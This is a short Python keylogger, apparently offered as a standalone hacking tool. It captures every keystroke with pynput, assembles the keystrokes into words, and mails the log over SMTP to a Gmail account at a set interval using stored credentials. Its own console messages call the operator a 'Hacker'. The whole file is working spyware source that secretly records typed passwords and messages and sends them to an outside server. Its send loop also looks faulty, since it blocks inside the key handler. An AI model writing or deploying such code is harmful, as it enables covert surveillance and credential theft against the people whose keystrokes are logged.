import email
import smtplib
import datetime
import time
from pynput.keyboard import Key, Listener

from config import Config as config

SEND_REPORT_EVERY = 60  # in seconds, 60 means 1 minute and so on

# setup email
email = config.MAIL_USERNAME
password = config.MAIL_PASSWORD
print("Connecting to gmail server...")
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
print('Login Hacker...')
server.login(email, password)
print('Hacker logged in.')

# logger
full_log = ''
word = ''


# Capture key presses
def on_press(key):
    global word
    global full_log
    global email
    global next_send

    # Add spaces for spacebar clicks and enter keys
    if key == Key.space or key == Key.enter:
        word += ' '
        full_log += word
        word = ''
        interval = datetime.timedelta(seconds=SEND_REPORT_EVERY)
        next_send = datetime.datetime.now() + interval

        # Send mail when the number of characters reaches the maximum mailable characters
        while True:
            send_mail()
            full_log = ''
            tdiff = next_send - datetime.datetime.now()
            time.sleep(tdiff.total_seconds())
            next_send = next_send + interval
    # delete characters of backspace clicks
    elif key == Key.backspace:
        word = word[:-1]
    #  Ignore shift keys
    elif key == Key.shift_l or key == Key.shift_r:
        return
    # Append characters to form readable words
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char

    # Escape cancels keylogger operation and returns to menu
    if key == Key.esc:
        return False


# send full logs to mail
def send_mail():
    server.sendmail(email, email, full_log)


# Keylog operation
with Listener(on_press=on_press) as listener:
    listener.join()
